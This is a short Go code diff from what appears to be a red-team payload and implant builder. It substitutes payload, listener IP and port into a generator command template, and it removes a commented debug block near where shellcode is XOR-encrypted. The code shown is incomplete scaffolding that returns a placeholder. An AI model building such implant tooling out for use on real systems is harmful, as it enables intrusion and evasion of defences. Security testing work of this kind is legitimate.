@@ -67,6 +67,16 @@ func generatePayload(opts *PayloadOptions) string {
 	framework, _ := ConvertUserInputToFramework(opts.TargetFramework)
 	fmt.Printf("[*] Generating payload with target framework: %s\n", framework)
 
+	generatorCmd := loadedData.Frameworks[opts.TargetFramework].GeneratorCmd
+
+	payload, _ := ConvertUserInputToPayload(opts.TargetFramework, opts.TargetOS, opts.Payload)
+	generatorCmd = strings.Replace(generatorCmd, "<--payload-->", payload, 1)
+	generatorCmd = strings.Replace(generatorCmd, "<--ip-->", opts.Lhost, 1)
+	generatorCmd = strings.Replace(generatorCmd, "<--port-->", opts.Lport, 1)
+	splitGeneratorCmd := strings.Split(generatorCmd, " ")
+
+	fmt.Println(splitGeneratorCmd)
+
 	fmt.Println("[*] Payload generated")
 	return "deadbeef"
 }
@@ -96,14 +106,6 @@ func generateImplantScript(shellcode string) {
 	if err := scanner.Err(); err != nil {
 		log.Fatal(err)
 	}
-
-	/*
-		fmt.Println("---- loaded script ----")
-		for _, l := range lines {
-			fmt.Println(l)
-		}
-		fmt.Println("-----------------------")
-	*/
 
 	// 2) Generating encryption values
 	xorKey := util.GenerateRandomString(10)
